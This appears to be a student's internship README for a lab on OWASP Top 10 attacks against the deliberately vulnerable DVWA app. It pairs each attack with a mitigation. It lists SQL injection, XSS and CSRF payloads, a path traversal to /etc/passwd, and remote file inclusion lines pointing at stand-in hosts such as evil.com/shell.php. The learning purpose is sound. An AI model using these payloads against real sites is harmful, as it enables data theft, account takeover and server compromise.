# 🌐 Task 3 — Web Application Security
> **ApexPlanet Cybersecurity Internship | Days 25–36**

![Task](https://img.shields.io/badge/Task-3-blue)
![Track](https://img.shields.io/badge/Track-Web%20App%20Security-teal)
![OWASP](https://img.shields.io/badge/OWASP-Top%2010-red)
![Status](https://img.shields.io/badge/Status-In%20Progress-orange)

---

## 📌 Objective
Identify and exploit **OWASP Top 10 vulnerabilities** in a controlled lab environment using DVWA (Damn Vulnerable Web Application) and demonstrate practical mitigations.

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| DVWA | Target vulnerable web application |
| Burp Suite | HTTP interception & fuzzing |
| Kali Linux | Attack platform |
| Apache/PHP | Web server configuration |
| securityheaders.com | Security headers analysis |
| hping3 | Traffic simulation |

---

## 🔴 Attacks Performed

| Attack | OWASP Category | Payload | Mitigation |
|--------|---------------|---------|-----------|
| SQL Injection | A03 - Injection | `' OR '1'='1` | Prepared Statements |
| Stored XSS | A07 - XSS | `<script>alert(1)</script>` | Input validation + CSP |
| Reflected XSS | A07 - XSS | `?name=<script>alert(1)</script>` | Output encoding |
| CSRF | A01 - Broken Access | Forged HTML form | CSRF tokens |
| LFI | A05 - Misconfiguration | `?page=../../../../etc/passwd` | Whitelist file paths |
| RFI | A05 - Misconfiguration | `?page=http://evil.com/shell.php` | Disable allow_url_include |
| Brute Force | A07 - Auth Failure | Burp Intruder + wordlist | Rate limiting |

---

## 📋 Steps Completed

### 1. 💉 SQL Injection
```bash
# Basic SQLi bypass
' OR '1'='1

# UNION-based data extraction
1' UNION SELECT user, password FROM users-- -

# Prevention — Prepared Statement (PHP)
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$id]);
```

### 2. ⚡ Cross-Site Scripting (XSS)
```html
<!-- Stored XSS payload -->
<script>alert('Stored XSS!')</script>

<!-- Reflected XSS via URL -->
http://[target]/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>

<!-- Mitigation: PHP output encoding -->
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

### 3. 🎭 CSRF Attack
```html
<!-- Forged CSRF form -->
<form action="http://[target]/dvwa/vulnerabilities/csrf/" method="GET">
  <input name="password_new" value="hacked123">
  <input name="password_conf" value="hacked123">
  <input type="submit" value="Win a Prize!">
</form>
```

### 4. 📂 File Inclusion
```bash
# Local File Inclusion (LFI)
http://[target]/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd

# Remote File Inclusion (RFI)
http://[target]/dvwa/vulnerabilities/fi/?page=http://attacker.com/shell.php

# Prevention in php.ini
allow_url_include = Off
allow_url_fopen = Off
```

### 5. 🔧 Burp Suite
```
Proxy → Intercept → Modify login request
Intruder → Sniper attack → Password field
Payload → Load rockyou.txt wordlist
Analyze → Sort by response length
```

### 6. 🛡️ Security Headers (Apache)
```apache
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Strict-Transport-Security "max-age=31536000"
Header always set Referrer-Policy "no-referrer"
```

---

## 📁 Repository Structure

```
Task-3/
├── README.md                            ← This file
├── Lab_Report_Task3_WebAppSecurity.docx
├── Task3_VideoScript_LinkedIn.md
├── attack-notes/
│   ├── sqli-notes.md
│   ├── xss-notes.md
│   └── csrf-notes.md
└── screenshots/
    ├── sqli-dump.png
    ├── stored-xss.png
    ├── reflected-xss.png
    ├── csrf-attack.png
    ├── lfi-passwd.png
    ├── burp-intercept.png
    ├── burp-intruder.png
    └── security-headers.png
```

---

## ✅ Deliverables

- [ ] Security Testing Report (SQLi, XSS, CSRF with screenshots)
- [ ] GitHub Repo with attack scenarios + mitigation notes ← *This repo*
- [ ] 8-min video demo of exploitation & its fix

---

## ⚠️ Disclaimer
> All attacks documented here were performed **only on DVWA — an intentionally vulnerable application — in a private isolated lab**. Never test on systems you don't own or have explicit permission to test.

---

*ApexPlanet Software Pvt. Ltd. | Cybersecurity Internship | SYEDMAHAMMEDAFZAL*
